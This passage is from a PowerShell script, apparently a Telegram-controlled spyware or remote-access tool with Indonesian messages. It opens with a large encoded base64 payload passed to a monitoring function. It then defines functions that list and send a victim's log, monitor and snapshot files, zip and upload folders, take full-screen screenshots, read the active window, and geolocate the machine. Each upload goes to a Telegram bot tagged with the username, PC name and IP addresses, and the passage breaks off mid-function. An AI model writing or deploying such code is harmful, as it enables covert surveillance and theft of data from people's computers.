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"

Start-Monitoring -base64 $base64 -key $key
}

function stop-sysmon {
    Stop-Monitoring
}


function List-Log {
    param(
        [string]$folderPath = $logFolder
    )

    if (Test-Path $folderPath) {
        $name = ""
        Get-ChildItem -Path $folderPath -File -Recurse | ForEach-Object {
            $name += $_.Name + "`n"
        }

        if ($name) {
            Send-Message $name
        } else {
            Send-Message "Tidak ada file log di folder: $folderPath"
        }
    } else {
        Send-Message "Folder tidak ditemukan: $folderPath"
    }
}

function List-Mon {
    param(
        [string]$folderPath = $MonPath
    )

    if (Test-Path $folderPath) {
        $name = ""
        Get-ChildItem -Path $folderPath -File -Recurse | ForEach-Object {
            $name += $_.Name + "`n"
        }

        if ($name) {
            Send-Message $name
        } else {
            Send-Message "Tidak ada file monitor di folder: $folderPath"
        }
    } else {
        Send-Message "Folder tidak ditemukan: $folderPath"
    }
}

function List-Snap {
    param(
        [string]$folderPath = $MonPathSnap
    )

    if (Test-Path $folderPath) {
        $name = ""
        # Mengambil folder, bukan file
        Get-ChildItem -Path $folderPath -Directory -Recurse | ForEach-Object {
            $name += $_.Name + "`n"
        }

        if ($name) {
            Send-Message $name
        } else {
            Send-Message "Tidak ada folder di dalam folder: $folderPath"
        }
    } else {
        Send-Message "Folder tidak ditemukan: $folderPath"
    }
}


function Get-Log {
    param(
        [string[]]$name
    )

    $tempFolder = "$env:TEMP\logsend_tmp"
    if (-not (Test-Path $tempFolder)) {
        try {
            New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
        } catch {
            Write-Error "Failed to create temp folder: $_"
            return
        }
    }

    if (-not (Test-Path $logFolder)) {
        Write-Error "Log folder not found: $logFolder"
        return
    }

    try {

        $logs = Get-ChildItem -Path $logFolder -File -Recurse -ErrorAction Stop
    } catch {
        Write-Error "Failed to get log files: $_"
        return
    }

    if ($name -contains "all") {
        Write-Verbose "Processing all log files..."
        foreach ($log in $logs) {
            try {
                $tempFile = Join-Path $tempFolder $log.Name
                Write-Verbose "Copying $($log.FullName) to $tempFile"
                
                Copy-Item -Path $log.FullName -Destination $tempFile -Force -ErrorAction Stop
                 Send-TelegramFile $tempFile              
                Write-Output "Successfully processed $($log.Name)"
                Remove-Item -Path $tempFile -Force -ErrorAction Continue
            } catch {
                Send-Message "❌ Gagal kirim $($log.Name): $_"
            }
        }
    } else {
        foreach ($n in $name) {
            try {
                $target = $logs | Where-Object { $_.Name -ieq $n } | Select-Object -First 1
                
                if (-not $target) {
                    Send-Message "[!] Log '$n' tidak ditemukan."
                    continue
                }

                $tempFile = Join-Path $tempFolder $target.Name
                Write-Verbose "Copying $($target.FullName) to $tempFile"
                Copy-Item -Path $target.FullName -Destination $tempFile -Force -ErrorAction Stop
                 Send-TelegramFile $tempFile
                Remove-Item -Path $tempFile -Force -ErrorAction Continue
            } catch {
 
                Send-Message "❌ Gagal kirim ${n} $_"
            }
        }
    }

    try {
        if ((Get-ChildItem -Path $tempFolder -ErrorAction SilentlyContinue | Measure-Object).Count -eq 0) {
            Remove-Item -Path $tempFolder -Force -ErrorAction Continue
        }
    } catch {
        Send-Message "Failed to clean up temp folder: $_"
    }
}

function Get-Mon {
    param(
        [string[]]$name
    )

    $tempFolder = "$env:TEMP\monsend_tmp"
    if (-not (Test-Path $tempFolder)) {
        try {
            New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
        } catch {
            Write-Error "Failed to create temp folder: $_"
            return
        }
    }

    if (-not (Test-Path $MonPath)) {
        Write-Error "Mon folder not found: $MonPath"
        return
    }

    try {

        $logs = Get-ChildItem -Path $MonPath -File -Recurse -ErrorAction Stop
    } catch {
        Write-Error "Failed to get log files: $_"
        return
    }

    if ($name -contains "all") {
        Write-Verbose "Processing all log files..."
        foreach ($log in $logs) {
            try {
                $tempFile = Join-Path $tempFolder $log.Name
                Write-Verbose "Copying $($log.FullName) to $tempFile"
                
                Copy-Item -Path $log.FullName -Destination $tempFile -Force -ErrorAction Stop
                 Send-TelegramFile $tempFile              
                Write-Output "Successfully processed $($log.Name)"
                Remove-Item -Path $tempFile -Force -ErrorAction Continue
            } catch {
                Send-Message "❌ Gagal kirim $($log.Name): $_"
            }
        }
    } else {
        foreach ($n in $name) {
            try {
                $target = $logs | Where-Object { $_.Name -ieq $n } | Select-Object -First 1
                
                if (-not $target) {
                    Send-Message "[!] Log '$n' tidak ditemukan."
                    continue
                }

                $tempFile = Join-Path $tempFolder $target.Name
                Write-Verbose "Copying $($target.FullName) to $tempFile"
                Copy-Item -Path $target.FullName -Destination $tempFile -Force -ErrorAction Stop
                 Send-TelegramFile $tempFile
                Remove-Item -Path $tempFile -Force -ErrorAction Continue
            } catch {
 
                Send-Message "❌ Gagal kirim ${n} $_"
            }
        }
    }

    try {
        if ((Get-ChildItem -Path $tempFolder -ErrorAction SilentlyContinue | Measure-Object).Count -eq 0) {
            Remove-Item -Path $tempFolder -Force -ErrorAction Continue
        }
    } catch {
        Send-Message "Failed to clean up temp folder: $_"
    }
}


function Get-Snap {
    param(
        [string[]]$name
    )

    $tempFolder = "$env:TEMP\snapsend_tmp"
    if (-not (Test-Path $tempFolder)) {
        try {
            New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
        } catch {
            Write-Error "Failed to create temp folder: $_"
            return
        }
    }

    if (-not (Test-Path $MonPathSnap)) {
        Write-Error "Mon folder not found: $MonPathSnap"
        return
    }

    try {
        $logs = Get-ChildItem -Path $MonPathSnap -File -Recurse -ErrorAction Stop
        $folders = Get-ChildItem -Path $MonPathSnap -Directory -Recurse -ErrorAction Stop
    } catch {
        Write-Error "Failed to get log files and folders: $_"
        return
    }

    if ($name -contains "all") {
        Write-Verbose "Processing all log folders..."
        foreach ($folder in $folders) {
            try {
                $zipFile = Join-Path $tempFolder "$($folder.Name).zip"
                Write-Verbose "Zipping folder $($folder.FullName) to $zipFile"

                # Zip folder before sending
                Compress-Archive -Path $folder.FullName -DestinationPath $zipFile -Force
                Send-TelegramFile $zipFile
                Write-Output "Successfully processed $($folder.Name)"
                Remove-Item -Path $zipFile -Force -ErrorAction Continue
            } catch {
                Send-Message "❌ Gagal kirim folder $($folder.Name): $_"
            }
        }
    } else {
        foreach ($n in $name) {
            try {
                $targetFolder = $folders | Where-Object { $_.Name -ieq $n } | Select-Object -First 1

                if (-not $targetFolder) {
                    Send-Message "[!] Folder '$n' tidak ditemukan."
                    continue
                }

                $zipFile = Join-Path $tempFolder "$($targetFolder.Name).zip"
                Write-Verbose "Zipping folder $($targetFolder.FullName) to $zipFile"
                
                # Zip folder before sending
                Compress-Archive -Path $targetFolder.FullName -DestinationPath $zipFile -Force
                Send-TelegramFile $zipFile
                Remove-Item -Path $zipFile -Force -ErrorAction Continue
            } catch {
                Send-Message "❌ Gagal kirim folder ${n}: $_"
            }
        }
    }

    try {
        if ((Get-ChildItem -Path $tempFolder -ErrorAction SilentlyContinue | Measure-Object).Count -eq 0) {
            Remove-Item -Path $tempFolder -Force -ErrorAction Continue
        }
    } catch {
        Send-Message "Failed to clean up temp folder: $_"
    }
}

function Send-TelegramFile {
    param (
        [string]$Path,
        [string]$Token = $token,
        [string]$ChatId = $chatid
    )

    $Path = Resolve-FolderToken $Path
    if (-Not (Test-Path $Path)) {
        Send-Message "❌ File tidak ditemukan: $Path"
        return
    }

    try {
        $caption = "📁 File from 🖥️ $username-$pcname ($localIP-$publicIP)"
        $fileName = [System.IO.Path]::GetFileName($Path)
        $fileBytes = [System.IO.File]::ReadAllBytes($Path)

        $boundary = [System.Guid]::NewGuid().ToString()
        $lf = "`r`n"

        $preBody = (
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"chat_id`"$lf$lf" +
            "$ChatId$lf" +
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"caption`"$lf$lf" +
            "$caption$lf" +
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$lf" +
            "Content-Type: application/octet-stream$lf$lf"
        )

        $postBody = "$lf--$boundary--$lf"

        # Convert strings to bytes
        $preBytes = [System.Text.Encoding]::UTF8.GetBytes($preBody)
        $postBytes = [System.Text.Encoding]::UTF8.GetBytes($postBody)

        # Gabungkan semua byte
        $allBytes = New-Object byte[] ($preBytes.Length + $fileBytes.Length + $postBytes.Length)
        [System.Buffer]::BlockCopy($preBytes, 0, $allBytes, 0, $preBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $allBytes, $preBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($postBytes, 0, $allBytes, $preBytes.Length + $fileBytes.Length, $postBytes.Length)

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        Invoke-WebRequest `
            -Uri "https://api.telegram.org/bot$Token/sendDocument" `
            -Method Post `
            -Body $allBytes `
            -Headers $headers `
            -UseBasicParsing
    }
    catch {
        Send-Message "❌ Gagal mengirim file: $_"
    }
}

function Send-TelegramFolder {
    param (
        [string]$FolderPath,
        [string]$Token = $token,
        [string]$ChatId = $chatid,
        [string]$Caption = "📦 Folder $FolderPath dikirim sebagai ZIP"
    )
    $FolderPath = Resolve-FolderToken $FolderPath
    if (-not (Test-Path $FolderPath)) {
        Send-Message "❌ Folder tidak ditemukan: $FolderPath"
        return
    }

    try {
        # Gunakan timestamp untuk nama zip
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $folderName = Split-Path -Path $FolderPath -Leaf
        $zipName = "${folderName}_$timestamp.zip"
        $tempZipPath = Join-Path $env:TEMP $zipName

        # Kompres folder ke zip
        Compress-Archive -Path $FolderPath -DestinationPath $tempZipPath -Force

        # Kirim file ke Telegram
        Send-TelegramFile $tempZipPath

        
    } catch {
        Send-Message "❌ Gagal mengirim folder: $_"
    } finally {
        # Hapus file zip sementara
        if (Test-Path $tempZipPath) {
            Remove-Item $tempZipPath -Force
        }
    }
}

function Send-TelegramPhoto {
    param (
        [string]$Path,
        [string]$Token = $token,
        [string]$ChatId = $chatid
    )
    $Path = Resolve-FolderToken $Path

    if (-Not (Test-Path $Path)) {
        Send-Message"❌ File tidak ditemukan: $Path"
        return
    }

    try {
        $caption = "📷 Photo from 🖥️ $username-$pcname ($localIP-$publicIP)"
        $fileName = [System.IO.Path]::GetFileName($Path)
        $fileBytes = [System.IO.File]::ReadAllBytes($Path)

        $boundary = [System.Guid]::NewGuid().ToString()
        $lf = "`r`n"

        $preBody = (
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"chat_id`"$lf$lf" +
            "$ChatId$lf" +
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"caption`"$lf$lf" +
            "$caption$lf" +
            "--$boundary$lf" +
            "Content-Disposition: form-data; name=`"photo`"; filename=`"$fileName`"$lf" +
            "Content-Type: image/jpeg$lf$lf"
        )

        $postBody = "$lf--$boundary--$lf"

        $preBytes = [System.Text.Encoding]::UTF8.GetBytes($preBody)
        $postBytes = [System.Text.Encoding]::UTF8.GetBytes($postBody)

        $allBytes = New-Object byte[] ($preBytes.Length + $fileBytes.Length + $postBytes.Length)
        [System.Buffer]::BlockCopy($preBytes, 0, $allBytes, 0, $preBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $allBytes, $preBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($postBytes, 0, $allBytes, $preBytes.Length + $fileBytes.Length, $postBytes.Length)

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        Invoke-WebRequest `
            -Uri "https://api.telegram.org/bot$Token/sendPhoto" `
            -Method Post `
            -Body $allBytes `
            -Headers $headers `
            -UseBasicParsing
    }
    catch {
        Send-Message "❌ Gagal mengirim foto: $_"
    }
}

function Send-Screenshot {
    param (
        [string]$Token = $token,
        [string]$ChatId = $chatid,
        [string]$Caption = "📸 Screenshot"
    )

    try {
        # Load .NET types untuk screenshot
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        # Ambil ukuran layar
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bmp.Size)

        # Simpan ke file sementara
        $tempPath = Join-Path $env:TEMP ("screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png")
        $bmp.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)

        # Kirim ke Telegram
        Send-TelegramPhoto $tempPath

    } catch {
        Send-Message "❌ Gagal ambil screenshot: $_"
    } finally {
        if (Test-Path $tempPath) {
            Remove-Item $tempPath -Force
        }
    }
}

function Get-ActiveWindowInfo {
    Add-Type @"
    using System;
    using System.Text;
    using System.Runtime.InteropServices;

    public class WinAPI {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
"@

    $hwnd = [WinAPI]::GetForegroundWindow()

    # Ambil judul window
    $title = New-Object System.Text.StringBuilder 1024
    [WinAPI]::GetWindowText($hwnd, $title, $title.Capacity) | Out-Null

    # Ganti $pid → $procId
    $procId = 0
    $null = [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$procId)
    $process = Get-Process -Id $procId -ErrorAction SilentlyContinue

    if ($process) {
        return @{
            AppName = $process.ProcessName + ".exe"
            Title   = $title.ToString()
        }
    } else {
        return @{
            AppName = "Unknown"
            Title   = $title.ToString()
        }
    }
}

function Get-Geolocation {
    $api = "http://ip-api.com/json"
    try {
        $response = Invoke-RestMethod -Uri $api -UseBasicParsing
        if ($response.status -eq "success") {
            $mapUrl = "https://www.google.com/maps?q=$($response.lat),$($response.lon)"
            $msg = @"
🌐 IP Address: $($response.query)
